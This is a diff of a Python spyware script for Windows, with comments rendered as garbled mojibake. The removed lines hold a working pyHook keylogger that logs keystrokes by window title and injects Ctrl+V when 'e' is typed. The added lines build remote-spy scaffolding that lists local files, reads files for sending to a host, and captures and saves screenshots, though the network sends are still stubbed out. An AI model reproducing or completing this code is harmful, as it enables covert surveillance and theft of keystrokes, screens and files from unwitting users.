@@ -1,70 +1,76 @@
 # -*- coding:utf-8 -*-
-from ctypes import *
 import pyHook
 import threading
-from PIL import ImageGrab
 import pythoncom
+import os
 import win32api
 import win32con
-from PIL import Image
-import pytesseract
-import socket
-currenttitle=''
-lasttitle=''
-jilu=[]
+import sys
+import chardet
+import time
+from PIL import ImageGrab
+IP=''
+#è¿™é‡Œéœ€è¦å¼€å¯ä¸¤ä¸ªç«¯å£ï¼Œ
+# ä¸€ä¸ªè´Ÿè´£å‘é€ä¿¡æ¯ï¼Œ threadnewssocket
+# ä¸€ä¸ªè´Ÿè´£å‘é€æ–‡ä»¶   threadfilesocket
+def sendthread(IP,FILE):
+    try:
+        if  os.path.exists(FILE):
+            with open(FILE, 'rb') as f:
+                for data in f:
+                    print(data)
+                    #s.send(data)
+                    pass #å‘é€æ–‡ä»¶
+            #s.send
+    except Exception:
+        #å¼‚å¸¸å¤„ç†
+        return
+def sendfiletohost(IP,FILE):
+    thread1 = threading.Thread(target=sendthread, args=(IP, FILE,))
+    thread1.start()
+def sendtohost(IP,INFO):
+    print(INFO)
+    pass
 def getlocaldir():
-	#»ñµÃµ±Ç°Â·¾¶
-	pass
+    try:
+        sendtohost(IP,os.getcwd())
+    except Exception:
+        pass
 def getlocalfiledir():
-	#»ñÈ¡µ±Ç°Â·¾¶ÏÂÎÄ¼ş
+    c=os.listdir(os.getcwd())
+    info=''
+    for i in c:
+        filepath=(os.getcwd()+'\\'+i).decode('GB2312')
+        if os.path.isfile(filepath):
+            info+=(filepath)
+            info+='  file'
+            info+='\n'
+        else:
+            info+=(filepath)
+            info+='  document'
+            info+='\n'
+    sendtohost(IP,info)
 def getthetopfiledir():
-	#»ñÈ¡ÉÏ½ìÂ·¾¶ÎÄ¼şÄ¿Â¼
+    toppath=(os.path.dirname(os.path.dirname(__file__))).decode('gb2312')
+    sendtohost(IP,toppath)
 def getfile(path,name):
-	#»ñÈ¡ÎÄ¼ş
+    FILE=path+'\\'+name
+    sendfiletohost(IP,FILE)
 def boomwenjian(path):
-	#±¬ÆÆ²¢»ñµÃÖ¸¶¨Ä¿Â¼ÏÂÎÄ¼ş
+    #é‚£å°±æ˜¯å¼ºåŠ¿çš„çˆ†ç ´æ‰€æœ‰æ–‡ä»¶233
+    pass
 def jietu():
-	pass
-	#»ñÈ¡½ØÍ¼
+    #
+    im = ImageGrab.grab()
+    name=os.getcwd()+"\\"+time.strftime("%H+%M+%S")+".jpg"
+    im.save(name)
+    sendfiletohost(IP,name)
 def cmd():
 	pass
-	#cmdÃüÁî 
-#¼üÅÌÊÂ¼ş´¦Àí£¬²¢ÇÒ·¢ËÍ
 def onKeyboardEvent(event):
-    global s
-    global jilu
-    global currenttitle
-    global lasttitle
-    windowTitle = create_string_buffer(512)
-    windll.user32.GetWindowTextA(event.Window,byref(windowTitle),512)
-    currenttitle= windowTitle.value.decode('gbk')
-    c = chr(event.Ascii)
-    #Èç¹ûÊÇe
-    if(c=='e'):
-        #Ä£ÄâÊÂ¼ş  Conyrol+V£¬Íê³É¸´ÖÆ¹¦ÄÜ
-        win32api.keybd_event(17, 0, 0, 0)  # ctrl¼üÎ»ÂëÊÇ17
-        win32api.keybd_event(86, 0, 0, 0)  # v¼üÎ»ÂëÊÇ86
-        win32api.keybd_event(86, 0, win32con.KEYEVENTF_KEYUP, 0)  # ÊÍ·Å°´¼ü
-        win32api.keybd_event(17, 0, win32con.KEYEVENTF_KEYUP, 0)
-    if(currenttitle!=lasttitle):
-        jilu=[]
-        jilu.append(currenttitle)
-    jilu.append(c)
-    print("you last letter",chr(event.Ascii))
-    lasttitle = windowTitle.value.decode('gbk')
     return True
 
-#¼üÅÌÊÂ¼ş£¬½Ø»ñ£¬´¦ÀíµÄÊÇÉÏ¸ödefº¯Êı£¬onKeyboardEvent
-def jianpan():
-    try :
-        hm = pyHook.HookManager()
-        hm.KeyDown = onKeyboardEvent #ÕâÀïÊÇ¼üÅÌÂäÏÂ£¬ÊÂ¼ş°ó¶¨ÓëonKeyboardEventº¯Êı
-        hm.HookKeyboard()
-        pythoncom.PumpMessages()
-    except Exception:
-        return
-threads=[]
-t2 = threading.Thread(target=jianpan)
-threads.append(t2)
-for i in  threads:
-    i.start()
+#getlocalfiledir()
+#getthetopfiledir()
+#getfile(os.getcwd(),"pyspy.py")
+jietu()
